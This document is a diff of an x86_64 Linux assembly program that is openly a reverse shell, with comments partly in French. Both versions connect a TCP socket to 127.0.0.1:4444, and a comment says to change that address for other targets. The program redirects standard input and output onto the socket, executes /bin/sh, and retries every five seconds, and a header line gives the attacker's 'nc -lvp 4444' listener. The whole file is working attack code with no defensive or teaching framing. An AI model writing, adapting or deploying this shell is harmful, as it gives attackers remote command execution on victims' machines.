@@ -1,6 +1,5 @@
-; client_corrected.asm - Reverse shell (x86_64 Linux)
-; Assemble: nasm -f elf64 client_corrected.asm -o client.o && ld client.o -o client
-; To connect from the attacker's side : nc -lvp 4444
+; Assemble: nasm -f elf64 client.asm -o client.o && ld client.o -o client
+; attacker side : nc -lvp 4444
 
 global _start
 
@@ -8,86 +7,87 @@ section .text
 
 _start:
 retry:
-    ; ----------------------------
-    ; socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
-    ; ----------------------------
-    xor rax, rax
-    mov rdi, 2          ; AF_INET
-    mov rsi, 1          ; SOCK_STREAM
-    mov rdx, 6          ; IPPROTO_TCP
-    mov rax, 41         ; syscall: socket
+
+    ;---  socket  ---
+
+    mov rdi, 2          ; Famille
+    mov rsi, 1          ; type_stream
+    mov rdx, 6          ; protocol
+    mov rax, 41
     syscall
     mov r8, rax         ; sauvegarde du socket fd
 
-    ; ----------------------------
-    ; Préparation de sockaddr_in
-    ; ----------------------------
-    sub rsp, 16         ; réserver 16 octets pour sockaddr_in
 
-    mov word [rsp], 2       ; sin_family = AF_INET
-    mov word [rsp+2], 0x5c11 ; sin_port = htons(4444)
-    mov dword [rsp+4], 0x0100007F ; sin_addr = 127.0.0.0
-    mov qword [rsp+8], 0     ; padding/zero
 
-    ; ----------------------------
-    ; connect(socket, sockaddr*, 16)
-    ; ----------------------------
-    mov rdi, r8         ; socket fd
-    mov rsi, rsp        ; sockaddr*
+    ;---  Préparation de l'adresse  ---
+
+    sub rsp, 16
+
+    mov word [rsp], 2             ; Famille
+    mov word [rsp+2], 0x5c11 	  ; Port 4444
+    mov dword [rsp+4], 0x0100007F ; Adresse => modifier si autre que 127.0.0.1
+
+
+
+    ;---  connect  ---
+
+    mov rdi, r8
+    mov rsi, rsp
     mov rdx, 16
-    mov rax, 42         ; syscall: connect
+    mov rax, 42
     syscall
     test rax, rax
-    js error
+    js wait_and_retry
 
 .suite:
-    ; ----------------------------
-    ; dup2(socket, 0), (1), (2)
-    ; ----------------------------
+
+    ;---  call de dup2  ---
+
     mov rsi, 0
+
 .dup_loop:
-    mov rax, 33         ; syscall: dup2
-    mov rdi, r8         ; socket fd
+    mov rax, 33
+    mov rdi, r8
     syscall
     inc rsi
     cmp rsi, 3
     jl .dup_loop
 
-    ; ----------------------------
-    ; execve("/bin/sh", NULL, NULL)
-    ; ----------------------------
+
+    ;---  execution du shell ---
+
+execve_call:
     xor rax, rax
-    push rax                    ; NULL
-    mov rbx, 0x68732f6e69622f2f ; "/bin//sh" (little endian)
+    push rax 
+    mov rbx, 0x68732f6e69622f2f
     push rbx
-    mov rdi, rsp                ; rdi = pointer to "/bin//sh"
-    xor rsi, rsi                ; argv = NULL
-    xor rdx, rdx                ; envp = NULL
-    mov rax, 59                 ; syscall: execve
+    mov rdi, rsp
+    xor rsi, rsi
+    xor rdx, rdx
+    mov rax, 59
     syscall
-	
-	
-error:
-	jmp wait_and_retry
+
 
 wait_and_retry:
-    ; close the socket first: syscall close(socket_fd)
+
+    ;---  call close(socket_fd)  ---
+
     mov rax, 3         ; syscall: close
     mov rdi, r8
     syscall
 
-    ; Prepare timespec struct on stack (5 sec sleep)
-    ; struct timespec { time_t tv_sec; long tv_nsec; }
-    sub rsp, 16
-    mov qword [rsp], 5       ; 5 seconds
-    mov qword [rsp+8], 0     ; 0 nanoseconds
+    ;---  call nanosleep  ---
 
-    mov rdi, rsp             ; const struct timespec *req
-    xor rsi, rsi             ; NULL for remaining time
-    mov rax, 35              ; syscall: nanosleep
+    sub rsp, 16
+    mov qword [rsp], 5
+    mov qword [rsp+8], 0
+
+    mov rdi, rsp         ; const struct timespec *req
+    xor rsi, rsi         ; NULL for remaining time
+    mov rax, 35          ; syscall: nanosleep
     syscall
 
-    add rsp, 16              ; clean timespec struct
-    add rsp, 16              ; clean sockaddr_in
+    add rsp, 16          ; clean sleep
+    add rsp, 16          ; clean de l'adresse
 
-    jmp retry               ; try again
+    jmp retry
